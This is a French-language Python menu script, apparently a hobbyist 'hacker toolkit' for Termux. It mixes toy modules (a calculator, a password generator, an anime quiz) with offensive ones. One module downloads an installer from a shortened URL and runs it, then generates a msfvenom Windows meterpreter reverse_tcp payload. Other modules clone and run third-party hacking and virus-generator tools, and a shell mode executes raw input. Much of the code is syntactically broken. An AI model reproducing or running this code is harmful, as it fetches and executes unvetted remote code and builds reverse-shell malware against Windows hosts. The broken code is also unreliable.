from hashlib import sha256
import random
import os
import webbrowser
import time
os.system("clear") 
print("\033[1;32") 

a =input("mmodule: ") 

webbrowser.open("https://github.com/EvilhackDKP")

def shell():
	while a =="shell":
		shell =input("shell.EvilhackDKP~$")
		os.system(shell)
		

	
def pwd():	
	if a =="pwd securited":
		demande_length_for_pass =input("quelle est la longeur du mot de passe: 		")	
		lower_case ="abcdefghijklmnopqrstuvwxyz"
		upper_case ="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		number ="0123456789"
		symbole ="@#€&_-()=%*':/!?+$€¥¢¤©®™~¿[]{}<>«»¡`;÷\|¦¬^×§¶°"
		use_for =lower_case + upper_case + number + symbole
		length_for_pass =int(demande_length_for_pass)
		password ="".join(random.sample(use_for, length_for_pass))
		print("your generated password is: " + password)
		
		

def nh():		
	if a =="install nh":
		print("ce module n'est que pour termux")
		os.system("apt update && apt upgrade")
		os.system("apt install wget")
		os.system("wget -O install-nethunter-termux https://off.ec/2MczZWr")
		os.system("chmod +x install-nethunter-termux")
		os.system("./install-nethunter-termux")
		print("repondre n a delete roots file ")
		os.system("nh")
		os.system("ls")
		ip =input("ip: ")	
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=4444 -f exe -o payload.exe")
		
	
def interpreter():	
	if a =="interpreter":
		os.system("python3")
		
	
def fake_help():	
	if a =="help":
		print("pas help mais help()")
		
	
	
def help():
	if a =="help()":
		print("shell:terminal python")
		print("pwd securited:mot de passe securise")
		print("install nh:install nethunter sur termux")
		print("interpreter:interpreter python3")
		print("time: donne l'heure")
		print("devilx: installe devilx")
		print("open link: ouvre mon github ;)")
		
	
def devilx():
	if a == "devilx":
		os.system("pkg update")
		os.system("pkg upgrade")
		os.system("pkg install git")
		os.system("git clone https://github.com/MrHacker-X/DevilX.git")
		os.system("cd DevilX")
		os.system("chmod +x *")
		os.system("bash setup.sh")
		
		
def open_lien():
		webbrowser.open("https://github.com/EvilhackDKP")
		webbrowser.open("https://f-droid.org/fr/")
		webbrowser.open("")
	
	
def time():	
	if a == "time":
		os.system("uptime")
		

def genvirus():
	os.system("apt update ; apt install git -y ; git clone git://github.com/Ign0r3dH4x0r/GenVirus.git ; cd GenVirus ; bash GenVirus.sh")

def calculator():
	a =input("quelle est le type d'operation que vous voulez executer: ")

	def addition():
		aa =input("premier nombre: ")
		ba =input("deuxieme nombre: ")
		print(int(aa) + int(ba))

	def soustraction():
		ps =input("premier nombre: ")
		ds =input("deuxieme nombre: ")
		print(int(ps)- int(ds))
	
	
	def multiplication():
		am =input("premier nombre: ")
		bm =input("deuxieme nombre: ")
		print(int(am) * int(bm))
	
	
	def division():
		ad =input("premier nombre: ")
		bd =input("deuxieme nombre: ")
		print(int(ad) / int(bd))
	
	
	while a == "addition":
		addition()
	
	
	
	
	while a == "soustraction":
		soustraction()
	
	
	
	while a =="multiplication":
		multiplication()
	
	
	
	while a =="division":
		division()
	
	

	if a != "addition"and "soustraction"and "multiplication"and "division":
		print("cette operation n'existe pas")
		print("//////////////////////////////////////////////////////////////////////////////////////////////////////////")
	
	
	
	if a =="sudo":
		print("qui est-tu ? quoi qu'il en soit tu t'interrese de près ou de loin a l'informatique. sache que d'autre commande son caché")



	if a =="msfvenom":
		print("oulalala,tu veux generer un payload ? c'est pas ici")
	
	
	if a =="msfconsole":
		print("pas de multi/handler !")

	if a =="whoami":
		print("pas root en tout cas !")
	
	
	if a =="whoami !?@#€[]!?":
		print("je suis... duc_kalipython !")
	
	
	if a =="python3":
		print("pas d'anaconda ni de python !")



	if a =="espion":
		print("je l'ai toujours pas sorti !")

	while a =="shell":
		shell =input("commande~#")
		os.system(shell)
	
	
	if a =="help":
		print("Quoi ?! tu veux que je t'aide ? non")
	
	
	if a =="fuzeIII":
		print("VIVE PALADIUM")
	
	
	
	if a =="hein":
		print("apagnan!")
	
	
	if a =="quoi":
		print("quoiquoubeh")
		

def anime():

	anime =input("quelle est ton anime pref ? ")

	if anime =="one piece":
		print("ok.j'aime pas trop mais si t'aime les pirates ok")
	
	if anime =="bleach":
		print("mouaiiiiis")
	
	if anime =="detective conan":
		print("trooooop bien ")
	
	
	if anime =="naruto":
		print("classique")
	
	if anime =="dragon ball":
		print("cooool")
	
	if anime =="hunter x hunter":
		print("mereum vs netero une pepite et kurapika vs Uvogin troooop 					badass")
	
	
	if anime =="demon slayer":
		print("soufle du soleil 4eme mouvement:azure sans nuage (je crois)")


def simplecode():
	a = input("code genere: ")

	n="0123456789"

	b=int(a)

	c="".join(random.sample(n,b))

	print(c)



def shifoumi():
	manches = int(input("Combien de manches voulez-vous jouer ? "))

	score_joueur = 0
	score_ordi = 0

	options = ["pierre", "papier", "ciseaux"]

	while score_joueur < manches and score_ordi < manches:
  		choix_joueur = input("Que jouez vous ? Tapez 'pierre', 'papier' ou 'ciseaux' ")
	while choix_joueur not in options:
    		input("Choix invalide ! Choisissez pierre, papier ou ciseaux (sans les guillemets)")

	choix_ordi = random.choice(options)

	if choix_joueur == choix_ordi:
   	 print("Égalité. Relancez le script pour rejouer")
	elif choix_joueur == "pierre" and choix_ordi == "ciseaux" \
 	 or choix_joueur == "papier" and choix_ordi == "pierre" \
	  or choix_joueur == "ciseaux" and choix_ordi == "papier":
 	   print("Vous remportez la manche,", choix_joueur, "bat" , choix_ordi)
					score_joueur += 1
	  else:
  	  print("L'ordinateur gagne la manche," , choix_ordi, "bat" , choix_joueur)
	    score_ordi += 1

	if score_joueur == manche:
	  print("Vous avez gagné la partie !")
	else:
	  print("L'ordinateur gagne :(")



def xor():
	entree = input("entree le nom du fichier a chiffrer : ")
	sortie = input("entree le nom du fichier final :")
	key = input("entree la clé :")
	key = sha256(key.encode('utf-8')).digest()
	with open(entree,'rb') as f_entree:
	with open(sortie,'wb') as f_sortie:
       	 i = 0
        	while f_entree.peek():
            	c = ord(f_entree.read(1))
           	 j = i % len(key)
            	b = bytes ([cˆkey[j]])
            	f_sortie.write(b)
           	 i = i + 1





def multi_annebsx():
	def annbisex():
		print("\033[1;34mSCAN ANNÉE BISEXTILE")
		annee = input("Saisissez une annee : ") 
		annee = int(annee)
 
		if annee % 400 == 0 or (annee % 4 == 0 and annee % 100 != 0):
          		print("L'annee saisie est bissextile.")
		else:
         		print("L'annee saisie n'est pas bissextile.")

	def multi():
		os.system("")
		os.system("clear")

		print("\033[1;34mMULTIPLICATION")

		n = input("un facteur s'il vous plait: ")

		i = input("le deuxieme facteur: ")

		print(int(n)*int(i))

	def display():
	  annbisex()
	  time.sleep(2)
	  multi()
  
  
	display()
  
  
if a == "multi_annbsx":
	multi_annbsx()


if a == "xor":
	xor()

if a == "shifoumi":
	shifoumi()

if a == "simplecode":
	simplecode()


if a == "anime":
	anime()



if a == "calculator":
	calculator()
	
	
if a == "time":
	time()

if a == "help()":
	help()
	
	
if a == "help":
	fake_help()
	
	
if a == "interpreter":
	interpreter()
	
	
if a == "install nh":
	nh()
	
	
if a == "pwd securited":
	pwd()
	
	
if a == "shell": 
	shell()

if a =="devilx":
	devilx()
	
if a =="open link":
	open_lien()
